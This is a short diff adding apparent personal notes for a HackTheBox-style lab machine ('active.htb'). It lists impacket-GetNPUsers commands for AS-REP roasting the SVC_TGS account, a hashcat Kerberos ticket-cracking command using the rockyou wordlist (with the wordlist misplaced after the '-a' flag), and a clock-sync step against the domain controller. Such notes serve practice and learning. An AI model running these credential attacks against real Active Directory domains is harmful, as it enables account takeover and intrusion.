@@ -1,0 +1,8 @@
+impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS -no-pass
+impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/SVC_TGS:<password>
+
+hashcat -m 13100 hash.txt -a /usr/share/wordlist/rockyou.txt 
+
+
+sudo apt install ntpdate
+ntpdate 10.10.10.100
